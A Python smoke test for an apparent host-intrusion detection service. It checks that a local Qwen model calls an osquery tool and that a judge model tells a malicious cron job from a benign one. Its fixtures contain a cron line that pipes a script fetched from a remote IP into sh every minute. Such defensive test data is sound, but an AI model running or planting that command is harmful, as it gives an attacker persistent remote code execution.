#!/usr/bin/env python3
"""真实模型冒烟测试：Qwen(:8000) 工具调用 + Kev(:8010) 三种题型。两个服务都起来后运行：
    python3 ice/serving/smoke_test.py
"""
import json
import sys
import time
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))
from ice.daemon.contracts import JudgeKind, JudgeQuery  # noqa: E402
from ice.daemon.judge import KevClient  # noqa: E402

QWEN = "http://localhost:8000/v1/chat/completions"
QWEN_MODEL = "nvidia/Qwen3.6-35B-A3B-NVFP4"
TOOL = {"type": "function", "function": {
    "name": "host_query", "description": "Run a read-only osquery SQL on the host",
    "parameters": {"type": "object", "properties": {"sql_or_log": {"type": "string"}}, "required": ["sql_or_log"]}}}


def qwen_tool_call() -> bool:
    body = {"model": QWEN_MODEL, "max_tokens": 4000, "tools": [TOOL], "messages": [{"role": "user", "content":
            "服务器上新出现一个 crontab: * * * * * curl http://45.9.1.2/x.sh|sh 。请调用 host_query 查一下是哪个用户加的。"}]}
    t = time.time()
    req = urllib.request.Request(QWEN, json.dumps(body).encode(), {"content-type": "application/json"})
    r = json.load(urllib.request.urlopen(req, timeout=300))
    c = r["choices"][0]
    calls = c["message"].get("tool_calls") or []
    print(f"[qwen] finish={c['finish_reason']} tokens={r['usage']['completion_tokens']} {time.time() - t:.1f}s")
    for tc in calls:
        print(f"       -> {tc['function']['name']}({tc['function']['arguments']})")
    return any(tc["function"]["name"] == "host_query" for tc in calls)


def kev_judge() -> bool:
    k = KevClient()
    bad = json.dumps({"type": "cron", "table": "crontab", "value": "* * * * * curl http://45.9.1.2/x.sh|sh",
                      "provenance": {"who": "/usr/sbin/apache2", "user": "www-data"}, "seen_before": False,
                      "src_ip": "45.9.1.2", "direction": "outbound"}, ensure_ascii=False)
    good = json.dumps({"type": "cron", "table": "crontab",
                       "value": "25 6 * * * test -x /usr/sbin/anacron || run-parts --report /etc/cron.daily",
                       "provenance": {"who": "dpkg", "user": "root"}, "seen_before": True}, ensure_ascii=False)
    qs = {
        "autorun": JudgeQuery(JudgeKind.NOUL, "这个变化会让某个程序以后自动运行吗？"),
        "verdict": JudgeQuery(JudgeKind.CHOICE, "这个变化整体属于哪一类？", options=["normal", "suspicious", "malicious"]),
        "severity": JudgeQuery(JudgeKind.SCORE, "严重程度？", options=["无害", "低", "中", "高", "严重"]),
    }
    verdicts = {}
    for name, state in (("bad", bad), ("good", good)):
        t = time.time()
        r = k.judge_batch(state, qs)
        verdicts[name] = r["verdict"].choice
        print(f"[kev ] {name:4s} {time.time() - t:.2f}s autorun={r['autorun'].score:.2f} "
              f"verdict={r['verdict'].choice}({r['verdict'].confidence:.2f}) severity={r['severity'].score:.2f}")
    return verdicts["bad"] != "normal" and verdicts["good"] == "normal"


if __name__ == "__main__":
    ok_q, ok_k = qwen_tool_call(), kev_judge()
    print(f"qwen tool call: {'PASS' if ok_q else 'FAIL'} | kev judge: {'PASS' if ok_k else 'FAIL'}")
    sys.exit(0 if ok_q and ok_k else 1)
